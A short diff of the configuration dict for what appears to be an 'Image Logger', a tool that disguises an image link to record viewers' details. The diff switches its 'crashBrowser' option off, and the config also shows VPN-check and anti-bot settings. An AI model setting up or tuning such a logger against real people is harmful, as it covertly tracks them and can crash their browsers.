@@ -10,7 +10,7 @@ config = {
     "image": "https://raw.githubusercontent.com/assettomods117-pixel/IMAGE-LOGGER/refs/heads/main/06e21ef5-4be3-4274-b7c0-681adbd313b8.jpeg",
     "username": "Image Logger",
     "color": 0x00FFFF,
-    "crashBrowser": True,
+    "crashBrowser": False,
     "buggedImage": False,
     "vpnCheck": 1,
     "antiBot": 1,
